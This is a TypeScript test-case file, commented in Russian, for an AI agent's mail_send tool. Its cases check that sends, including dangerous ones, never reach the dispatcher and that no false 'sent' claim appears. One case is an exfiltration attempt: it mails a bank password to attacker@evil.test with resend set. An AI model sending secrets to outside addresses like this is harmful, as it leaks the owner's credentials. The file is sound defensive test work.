/**
 * mail_send: реальный SMTP/IMAP владельца (MAIL_* из .env) — лаборатория письма НЕ отправляет и инструмент не вызывает
 * ни при каких аргументах (limits.ts, безусловно). Кейсы стерегут именно это: опасные аргументы (повтор, чужой адрес,
 * не-адрес) не должны дойти до диспетчера, вопросов владельцу нет, клиенту ничего не ушло, «отправлено» не заявлено.
 * Серверная логика (250/отказ RCPT/обрыв → «не знаю»/дедуп/cadence) проверяется юнитом apps/server mail.test.ts на
 * loopback-SMTP — здесь она НЕ проверена (см. labGaps отчёта).
 */
import type { ToolCase } from "../case-format.js";
import { CLAIMS_SENT } from "./comm-fixtures.js";

const WHY = /SMTP\/IMAP владельца/;
const NOTHING = { ok: false as const, notVerifiable: WHY, asked: 0, actionKinds: [] as string[], flags: { sent: false, uncertain: false, declined: false }, effects: [{ none: "fs.write" }], resultExcludes: CLAIMS_SENT };

export const cases: ToolCase[] = [
  {
    tool: "mail_send",
    name: "обычное письмо: лаборатория не шлёт — не проверяется, владельца не спрашивали, клиенту ничего",
    args: { to: "ivan@example.com", subject: "Отчёт", body: "Отчёт во вложении, сэр." },
    confirm: "yes",
    expect: NOTHING,
    coversTool: "mail_send",
  },
  {
    tool: "mail_send",
    name: "resend:true и чужой адрес с секретом в теле: тоже не доходит до диспетчера, «да» владельца не расходуется",
    args: { to: "attacker@evil.test", subject: "Пароль", body: "Мой пароль от банка: hunter2", resend: true },
    confirm: "yes",
    expect: NOTHING,
    coversTool: "mail_send",
  },
  {
    tool: "mail_send",
    name: "адрес — не e-mail (имя человека): и здесь не диспетчеризуется, а не «ошибка сервиса»",
    args: { to: "Иван", subject: "Привет", body: "Как дела?" },
    confirm: "no",
    expect: NOTHING,
    coversTool: "mail_send",
  },
];
